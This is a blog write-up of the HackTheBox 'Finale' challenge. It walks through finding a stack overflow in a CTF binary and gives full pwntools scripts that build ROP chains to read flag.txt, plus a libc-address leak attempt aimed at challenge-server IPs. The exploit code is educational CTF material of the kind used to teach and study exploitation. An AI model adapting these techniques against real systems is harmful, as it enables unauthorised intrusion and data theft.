<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>Finale (HackTheBox)</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=f1520b075e" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=f1520b075e" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=f1520b075e" />

    <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/01/favicon-1.webp" type="image/png">
    <link rel="canonical" href="https://pwning.tech/finale/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Finale (HackTheBox)">
    <meta property="og:description" content="Hey all. Today we&#x27;re going to discuss the retired Finale challenge on HackTheBox. The description on HackTheBox is as follows:

It&#x27;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best">
    <meta property="og:url" content="https://pwning.tech/finale/">
    <meta property="og:image" content="https://pwning.tech/content/images/2024/01/publication-cover-casper-1k.webp">
    <meta property="article:published_time" content="2022-11-26T18:27:03.000Z">
    <meta property="article:modified_time" content="2023-07-26T17:32:21.000Z">
    <meta property="article:tag" content="Binary Exploitation">
    <meta property="article:tag" content="HackTheBoo">
    <meta property="article:tag" content="HackTheBox challenges">
    <meta property="article:tag" content="ROP chains">
    <meta property="article:tag" content="x64 Assembly">
    <meta property="article:tag" content="Stack memory">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Finale (HackTheBox)">
    <meta name="twitter:description" content="Hey all. Today we&#x27;re going to discuss the retired Finale challenge on HackTheBox. The description on HackTheBox is as follows:

It&#x27;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best">
    <meta name="twitter:url" content="https://pwning.tech/finale/">
    <meta name="twitter:image" content="https://pwning.tech/content/images/2023/12/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Binary Exploitation, HackTheBoo, HackTheBox challenges, ROP chains, x64 Assembly, Stack memory">
    <meta name="twitter:site" content="@notselwyn">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="482">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://pwning.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://pwning.tech/content/images/2024/01/logo_transparent.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://pwning.tech/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "Finale (HackTheBox)",
    "url": "https://pwning.tech/finale/",
    "datePublished": "2022-11-26T18:27:03.000Z",
    "dateModified": "2023-07-26T17:32:21.000Z",
    "keywords": "Binary Exploitation, HackTheBoo, HackTheBox challenges, ROP chains, x64 Assembly, Stack memory",
    "description": "Hey all. Today we&#x27;re going to discuss the retired Finale challenge on HackTheBox. The description on HackTheBox is as follows:\n\nIt&#x27;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best for the upcoming year!\n\nIn this write-up, we will learn about the stack, ROP chains, and prioritizing attack vectors.\n\nSpoiler alert: if you can&#x27;t find the libc version, it&#x27;s not a bug.\n\n\nSummary\n\n * First looks\n * Find",
    "mainEntityOfPage": "https://pwning.tech/finale/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://pwning.tech/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
    
    <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=f1520b075e"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=f1520b075e">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-highlight/prism-line-highlight.min.css" integrity="sha512-nXlJLUeqPMp1Q3+Bd8Qds8tXeRVQscMscwysJm821C++9w6WtsFbJjPenZ8cQVMXyqSAismveQJc0C1splFDCA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-binexp tag-spooktober tag-htb-challenges tag-rop-chains tag-x64-assembly tag-stack-memory tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://pwning.tech">
                        <img src="https://pwning.tech/content/images/2024/01/logo_transparent.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://pwning.tech/">Home</a></li>
    <li class="nav-about-me"><a href="https://pwning.tech/about/">About Me</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-binexp tag-spooktober tag-htb-challenges tag-rop-chains tag-x64-assembly tag-stack-memory tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/binexp/">Binary Exploitation</a>
                </span>
        </div>

        <h1 class="article-title">Finale (HackTheBox)</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2022-11-26">Nov 26, 2022</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>Hey all. Today we're going to discuss the retired <a href="https://app.hackthebox.com/challenges/finale">Finale</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>It's the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best for the upcoming year!</blockquote><p>In this write-up, we will learn about the <strong>stack, ROP chains</strong>, and prioritizing<strong> attack vectors</strong>. </p><p>Spoiler alert: if you can't find the libc version, it's not a bug. </p><h1 id="summary">Summary</h1><ul><li>First looks</li><li>Finding vulnerability primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li><li>Failed attempt</li></ul><h1 id="first-looks">First looks</h1><p>We are given an executable binary called <code>finale</code>. Upon performing a dynamic analysis, we are prompted for a password which means that we'll need to do a static analysis in order to proceed. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">[Strange man in mask screams some nonsense]: iut2rxgf

[Strange man in mask]: In order to proceed, tell us the secret phrase: &lt;...&gt;

[Strange man in mask]: Sorry, you are not allowed to enter here!</code></pre><figcaption>The dynamic analysis</figcaption></figure><p>Running pwntools' <code>checksec</code> on <code>finale</code> gives us:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ checksec finale
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><figcaption>Checksec output</figcaption></figure><p>The fields mean:</p><ul><li>Arch: the CPU architecture and instruction set (x86, ARM, MIPS, ...)</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/relro">RELRO</a>: Relocation Read-Only - secures the <a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">dynamic linking process</a></li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">Stack Canaries</a>: protects against stack buffer overflow attacks</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">NX</a>: No eXecute - write-able memory cannot be executed</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: Position Independable Executable - address randomization</li></ul><p>For a more in-depth conclusion about checksec, please visit our <a href="https://pwning.tech/blacksmith/">previous blogpost</a> about the Blacksmith challenge on Hack The Box. The logical conclusion is that we need to perform a stack-based buffer overflow (since Stack Canaries are disabled) leading to a Return-Oriented-Programming chain (since NX is enabled). </p><h1 id="finding-vulnerability-primitives">Finding vulnerability primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact.</p><h3 id="main-analysis">Main() analysis</h3><p>In order to analyze the binary, I opened it up in <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, made by the NSA. The <code>main()</code> function prints 8 random bytes, asks us for a secret and calls <code>finale()</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">long main()
{
  int iVar1;
  char secret [16];
  char rand [8];
  ulong i;
  
  banner();
  rand = 0;
  iVar1 = open("/dev/urandom",0);
  read(iVar1,rand,8);
  printf("\n[Strange man in mask screams some nonsense]: %s\n\n",rand);
  close(iVar1);
  secret._0_8_ = 0;
  secret._8_8_ = 0;
  printf("[Strange man in mask]: In order to proceed, tell us the secret phrase: ");
  __isoc99_scanf("%16s",secret);
  i = 0;
  do {
    if (i &gt; 14) {
LAB_CHECK_SECRET:
      iVar1 = strncmp(secret,"s34s0nf1n4l3b00",15);
      if (iVar1 == 0) {
        finale();
      } else {
        printf("%s\n[Strange man in mask]: Sorry, you are not allowed to enter here!\n\n","\x1b[1;31m");
      }
      return;
    }
    if (secret[i] == '\n') {
      secret[i] = '\0';
      goto LAB_CHECK_SECRET;
    }
    i++;
  } while( true );
}

</code></pre><figcaption>Main function</figcaption></figure><p>As we can see, the secret for the binary is <code>s34s0nf1n4l3b00</code> and <code>finale()</code> gets called after the correct secret has been entered. </p><h3 id="finale-analysis">Finale() analysis</h3><p>As said, <code>main()</code> calls <code>finale()</code> after the secret has been entered. This function asks us for a wish for the next year. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">void finale()
{
  char buf[64];
  
  printf("\n[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [%p]",buf);
  printf("\n\n[Strange man in mask]: Now, tell us a wish for next year: ");
  fflush(stdin);
  fflush(stdout);
  read(0,buf,0x1000);
  write(1,"\n[Strange man in mask]: That\'s a nice wish! Let the Spooktober Spirit be with you!\n\n",0x54);
  return;
}</code></pre><figcaption>Finale function</figcaption></figure><p>We are given stack leak in the form of <code>char* buf</code>. Furthermore, there is a stack buffer overflow: the buffer length is 64 and we are writing 0x1000 (4096) bytes. In Ghidra we can see that the offset to the return address from the base of <code>buf</code> is <strong>0x48</strong> bytes.</p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image.png" class="kg-image" alt loading="lazy" width="450" height="81"></figure><h3 id="got">GOT</h3><p>Considering checksec said <code>No PIE (0x400000)</code>, we can use the Procedural Linking Table (PLT) section of the binary. This means we could open a potential <code>flag.txt</code> using <code>open()</code>, <code>read()</code> and <code>write()</code>. </p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Considering the protections in the binary listed by checksec state that No eXecute is enabled, we need to use <strong>Return Oriented Programming (ROP) chains</strong>. We want to do the following in the payload:</p><pre><code class="language-c">fd = open("flag.txt", 0);
n_read = read(3, buf, size);  // 3 since fd == 3 can be expected
write(1, buf, n_read);</code></pre><p>We have access to:</p><ul><li>Binary/ELF</li><li>   GOT and PLT (linked functions)</li><li> Functions (built-in functions)</li><li>Stack</li></ul><p>Using <code>print(*ELF('challenge/finale').plt.keys())</code>, we can see that the following functions are available in the PLT sections:</p><figure class="kg-card kg-code-card"><pre><code>strncmp puts write printf alarm
close read srand time fflush
setvbuf open __isoc99_scanf rand</code></pre><figcaption>Available functions in the PLT section</figcaption></figure><p>Now we have the right functions and have access to the stack (for "flag.txt"), we need to need a way to pass function arguments. The x64 calling convention states that function arguments should be passed (in order) via RDI, RSI, RDX, RCX, R8, R9. This means that we need to control the <strong>RDI</strong>, <strong>RSI</strong>, and <strong>RDX</strong> registers via <strong>pop instructions</strong> (called <strong>gadgets</strong>) in the <strong>ROP-chain</strong> in order to pass <strong>3</strong> arguments to <code>open()</code>, <code>read()</code>, and <code>write()</code>. We can search for such gadgets using <a href="https://github.com/Ben-Lichtman/ropr">ropr</a>: a blazing fast multithreaded ROP Gadget finder. Below is my search regex filter for ropr:</p><pre><code class="language-bash">$ ropr -R '^pop (rdi|rsi|rdx); ret;' challenge/finale  
0x004012d6: pop rdi; ret;
0x004012d8: pop rsi; ret;
</code></pre><p>Sadly, ropr <strong>can't find</strong> any gadgets for the <strong>RDX</strong> register. Even after trying many more search queries (like <strong>EDX </strong>and <strong>DX</strong>), I couldn't find any results. This means that we need to find a workaround for a high-enough RDX value for <code>read(..., ..., size=RDX)</code>.</p><h3 id="gnu-debugger-gdb">GNU Debugger (GDB)</h3><p>In order to find out a way to get a high RDX value, I used GDB with the <a href="https://github.com/pwndbg/pwndbg">Pwndbg</a> plug-in (please say <code>/pwn-dbg/</code> and not <code>/poʊndbæg/</code> as the repo proposes). To see the RDX value during runtime, we can use the GDB functions in pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF('challenge/finale')
p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b'A'*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b"next year: ", payload)
    p.recvuntil(b"you!\n\n")  # clear buffer
    return u64(p.recvuntil(b"\n")[:-1].ljust(8, b'\x00'))


p.sendlineafter(b"secret phrase: ", b"s34s0nf1n4l3b00")
p.recvuntil(b"good luck: [")  # clear buffer for next address read

leak = int(p.recvuntil(b"]")[:-1], 16)
print("leak @", hex(leak))

file = b'flag.txt\0'
rbp = leak + 0x170

payload = file + b'A'*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(0x4014c7)

gdb.attach(p, 'b *0x4014c7\ncontinue')
p.sendafter(b"next year: ", payload)

while True:
    print(p.recv())
</code></pre><figcaption>Payload for opening GDB at the open() call</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>0x00000000004014e0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
 RAX  0x3
 RBX  0x0
 RCX  0x7ffc887475a0 —▸ 0x7f76d739e2e0 ◂— 0x0
 RDX  0x8
*RDI  0x3
 RSI  0x7ffc887475a0 —▸ 0x7f76d739e2e0 ◂— 0x0
 R8   0x3c
 R9   0x7ffc887451bc ◂— 0x3c00007f76
 R10  0x0
 R11  0x246
 R12  0x7ffc887475f8 —▸ 0x7ffc88748289 ◂— '~/Documents/ctf/htb/finale/challenge/finale'
 R13  0x401492 (main) ◂— endbr64 
 R14  0x403d70 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4012a0 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7f76d739d040 (_rtld_global) —▸ 0x7f76d739e2e0 ◂— 0x0
 RBP  0x7ffc887475c0 —▸ 0x7ffc887475f0 ◂— 0x1
 RSP  0x7ffc887474c0 ◂— 0xe193b4642436643b
*RIP  0x4014e0 (main+78) ◂— call 0x401170
─────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
   0x4014cf &lt;main+61&gt;     lea    rcx, [rbp - 0x20]
   0x4014d3 &lt;main+65&gt;     mov    eax, dword ptr [rbp - 0xc]
   0x4014d6 &lt;main+68&gt;     mov    edx, 8
   0x4014db &lt;main+73&gt;     mov    rsi, rcx
   0x4014de &lt;main+76&gt;     mov    edi, eax
 ► 0x4014e0 &lt;main+78&gt;     call   read@plt                      &lt;read@plt&gt;
        fd: 0x3 (~/Documents/ctf/htb/finale/flag.txt)
        buf: 0x7ffc887475a0 —▸ 0x7f76d739e2e0 ◂— 0x0
        nbytes: 0x8
 
   0x4014e5 &lt;main+83&gt;     lea    rax, [rbp - 0x20]
   0x4014e9 &lt;main+87&gt;     mov    rsi, rax
   0x4014ec &lt;main+90&gt;     lea    rax, [rip + 0x1425]
   0x4014f3 &lt;main+97&gt;     mov    rdi, rax
   0x4014f6 &lt;main+100&gt;    mov    eax, 0</code></pre><figcaption>GDB breakpoint dump</figcaption></figure><p>As we can see, RDX is equal to 8 which means only 8 bytes of the flag get read and written to stdout. Since we need to read at least 32 bytes, we need to find a way of manipulating the RDX register. We could do this by:</p><ul><li>Calling <code>open("flag.txt", 0)</code> using the PLT section in the ELF (which only executes the function and immediately returns after)</li><li><strong>Manipulate RDX</strong></li><li>Calling <code>0x4014e0</code> so we read() with the manipulated RDX and write() to stdout all at once.</li></ul><p>As said, I tried finding gadgets which sadly did not work. After manually analyzing the binary I happened to see the following gadget:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00401476 ba 54 00     MOV       EDX,0x54
               00 00
      0040147b 48 8d 05     LEA       RAX,[s__[Strange_man_in_mask]:_That's_a_ = "\n[Strange man in mask]: 
               2e 14 00 
               00
      00401482 48 89 c6     MOV       RSI=&gt;s__[Strange_man_in_mask]:_That's_a_ = "\n[Strange man in mask]: 
      00401485 bf 01 00     MOV       EDI,0x1
               00 00
      0040148a e8 a1 fc     CALL      &lt;EXTERNAL&gt;::write                         ssize_t write(int __fd, void
               ff ff
      0040148f 90            NOP
      00401490 c9            LEAVE
      00401491 c3            RET
</code></pre><figcaption>Part of the finale() function</figcaption></figure><p>As we can see, the EDX register is set to 0x54. This means we will read and write 84 bytes of the flag, which means it's more than enough and that we have completed the final part of the ROP chain:</p><ul><li>open@PLT("flag.txt", 0)</li><li>finale() // to set RDX to 0x54</li><li>Set RDI to 3</li><li>Set RSI to the buffer buf</li><li>JMP <code>0x4016e0</code></li></ul><p>A.k.a.:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">file = b'flag.txt\0'
rbp = leak - 0x5000

payload = file + b'A'*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b"next year: ", payload)

payload = file + b'A'*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b"next year: ", payload)
</code></pre><figcaption>The Python representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>So, the grant scene of the script is:</p><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF('challenge/finale')
is_remote = False
if is_remote:
    p = remote("167.99.204.5", 31431)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b'A'*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b"next year: ", payload)
    p.recvuntil(b"you!\n\n")  # clear buffer
    return u64(p.recvuntil(b"\n")[:-1].ljust(8, b'\x00'))


p.sendlineafter(b"secret phrase: ", b"s34s0nf1n4l3b00")
p.recvuntil(b"good luck: [")  # clear buffer for next address read

leak = int(p.recvuntil(b"]")[:-1], 16)
print("leak @", hex(leak))

file = b'flag.txt\0'
rbp = leak - 0x5000

payload = file + b'A'*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b"next year: ", payload)

payload = file + b'A'*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b"next year: ", payload)
while True:
    print(p.recv())
</code></pre><p></p><h1 id="failed-attempt">Failed attempt</h1><p>In my failed attempt I tried to get remote code execution using leaked libc offsets, but it turned out that the libc version on the server was custom and it was intended to prevent this solution. I had to find out by asking the creator of the challenge.</p><p>The way we leak libc addresses is by calling <code>puts()</code> in the PLT section with the argument being a libc function linked in the GOT section. So, we need to call <code>puts(const char *string);</code> with argument <code>string</code> via the <code>RDI</code> register in AMD64. To control the RDI register, we use a ROP chain that pops RDI:</p><pre><code class="language-bash">$ ropr -R 'pop rdi; ret;' challenge/finale
0x004012d6: pop rdi; ret;

==&gt; Found 1 gadgets in 0.004 seconds</code></pre><p>Now we can pop a GOT function address into RDI and call <code>puts()</code> to leak the function offset. Let's run the following script with the server as target to get their libc version:</p><figure class="kg-card kg-code-card"><pre><code class="language-python3">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF('challenge/finale')
is_remote = False
if is_remote: 
    p = remote("161.35.173.232", 31394)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x004012d6)

def leak_func(address):
    payload = b'A'*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)
    
    p.sendafter(b"next year: ", payload)
    p.recvuntil(b"you!\n\n")  # clear buffer
    return u64(p.recvuntil(b"\n")[:-1].ljust(8, b'\x00'))

p.sendlineafter(b"secret phrase: ", b"s34s0nf1n4l3b00")
p.recvuntil(b"good luck: [")  # clear buffer for next address read

leak = int(p.recvuntil(b"]")[:-1], 16)
print("leak @", hex(leak))

#gdb.attach(p)
for name, addr in e.got.items():
    print(name, "@", hex(leak_func(addr)))
</code></pre><figcaption>The payload for leaking LIBC addresses</figcaption></figure><p>The output is the following:</p><pre><code>__libc_start_main @ 0x7ff2d7c29dc0
__gmon_start__ @ 0x0
stdout @ 0x7ff2d7e1a780
stdin @ 0x7ff2d7e19aa0
strncmp @ 0x0
puts @ 0x7ff2d7c80ed0
write @ 0x7ff2d7d14a20
printf @ 0x7ff2d7c60770
alarm @ 0x7ff2d7cea5b0
close @ 0x0
read @ 0x7ff2d7d14980
srand @ 0x7ff2d7c460a0
time @ 0x7ffdaafcfc60
fflush @ 0x7ff2d7c7f1b0
setvbuf @ 0x7ff2d7c81670
open @ 0x7ff2d7d14690
__isoc99_scanf @ 0x7ff2d7c62110
rand @ 0x7ff2d7c46760</code></pre><p>When I enter those symbols and addresses into a libc-leak website like <a href="https://libc.rip/">libc.rip</a>, I cannot find a single libc version. That means that there's a custom libc version, which means we can't call <code>system()</code> since we don't have the address.</p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)
                </h2>
            </header>
